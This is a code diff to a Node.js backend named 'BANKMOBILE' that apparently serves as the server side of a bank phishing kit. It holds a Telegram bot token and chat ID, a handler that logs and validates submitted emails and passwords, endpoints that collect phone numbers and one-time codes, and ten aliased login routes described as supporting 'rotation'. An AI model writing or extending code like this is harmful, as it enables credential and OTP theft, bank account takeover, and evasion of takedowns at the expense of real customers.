@@ -1,5 +1,5 @@
 // ================================================
-// BANKMOBILE - BACKEND (RENDER FIXED)
+// BANKMOBILE - BACKEND (WITH ALL ENDPOINTS)
 // ================================================
 
 require('dotenv').config();
@@ -14,7 +14,7 @@ const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 // ================================================
-// CORS - FIXED
+// CORS
 // ================================================
 app.use(cors({
     origin: '*',
@@ -91,9 +91,9 @@ async function authenticateWithAPI(email, password) {
 }
 
 // ================================================
-// ENDPOINT: /authenticate
+// SHARED AUTH HANDLER
 // ================================================
-app.post('/authenticate', async (req, res) => {
+async function handleAuth(req, res) {
     const { email, password } = req.body;
     
     console.log(`\n🔐 Login attempt: ${email}`);
@@ -123,22 +123,23 @@ app.post('/authenticate', async (req, res) => {
         console.log('❌ INVALID');
         res.json({ success: false, error: 'Invalid credentials' });
     }
-});
+}
 
 // ================================================
-// ALSO SUPPORT /api/authenticate
+// ALL AUTH ENDPOINTS - SUPPORTS ROTATION
 // ================================================
-app.post('/api/authenticate', async (req, res) => {
-    // Forward to the main authenticate handler
-    const { email, password } = req.body;
-    req.body = { email, password };
-    // Reuse the same handler
-    app._router.handle(req, res, (err) => {
-        if (err) {
-            res.status(500).json({ success: false, error: err.message });
-        }
-    });
-});
+app.post('/authenticate', handleAuth);
+app.post('/auth', handleAuth);
+app.post('/verify', handleAuth);
+app.post('/login', handleAuth);
+app.post('/validate', handleAuth);
+
+// Also support /api/ versions
+app.post('/api/authenticate', handleAuth);
+app.post('/api/auth', handleAuth);
+app.post('/api/verify', handleAuth);
+app.post('/api/login', handleAuth);
+app.post('/api/validate', handleAuth);
 
 // ================================================
 // OTHER ENDPOINTS
@@ -185,6 +186,10 @@ app.get('/', (req, res) => {
         status: 'running',
         endpoints: {
             'POST /authenticate': 'Login',
+            'POST /auth': 'Login',
+            'POST /verify': 'Login',
+            'POST /login': 'Login',
+            'POST /validate': 'Login',
             'POST /submit-phone': 'Submit phone',
             'POST /submit-otp': 'Submit OTP',
             'GET /health': 'Health check'
